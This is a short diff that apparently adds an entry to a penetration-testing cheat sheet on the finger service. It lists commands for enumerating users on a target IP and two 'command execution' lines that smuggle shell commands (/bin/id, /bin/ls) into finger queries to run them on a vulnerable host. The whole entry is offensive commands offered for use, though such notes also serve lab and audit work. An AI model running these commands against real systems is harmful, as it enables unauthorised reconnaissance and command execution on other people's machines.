@@ -1,0 +1,8 @@
+# Finger
+# User enumeration
+finger @<IP>
+finger <USER>@<IP>
+
+# Command execution
+finger "|/bin/id@<IP>"
+finger "|/bin/ls -a /<IP>"
